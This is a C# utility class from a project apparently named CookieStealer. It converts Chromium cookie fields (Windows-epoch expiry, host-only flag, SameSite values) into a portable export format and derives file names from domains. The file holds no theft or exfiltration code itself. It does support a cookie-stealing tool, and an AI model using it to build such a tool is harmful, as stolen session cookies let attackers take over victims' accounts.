namespace CookieStealer.Utilities;

public static class Translator
{
    public static double ConvertExpiresUtcToExpirationDate(decimal expiresUtc)
    {
        
        var windowsEpoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
        var unixEpoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);

        var expiresUtcTicks = (long)expiresUtc * 10;

        var expiresUtcDatetime = windowsEpoch.AddTicks(expiresUtcTicks);

        var timeSpan = expiresUtcDatetime - unixEpoch;
        var expirationDate = timeSpan.TotalSeconds;

        return expirationDate;
        
    }
    
    public static bool HostOnly(string? hostKey)
    {
        var isHostOnly = !hostKey.StartsWith(".");
        return isHostOnly;
    }
    
    
    public static string? SameSite(int sameSite)
    {
        return sameSite switch
        {
            -1 => null,
            0 => "no_restriction",
            1 => "lax",
            2 => "strict",
            _ => throw new ArgumentException("Invalid sameSite value")
        };
    }

    public static string? FileName(string? domain)
    {
        var fileName = domain;
        if (domain.StartsWith("www."))
        {
            fileName = domain[4..];
        }
        else if (domain.StartsWith("."))
        {
            fileName = domain[1..];
        }

        return fileName;
    }

}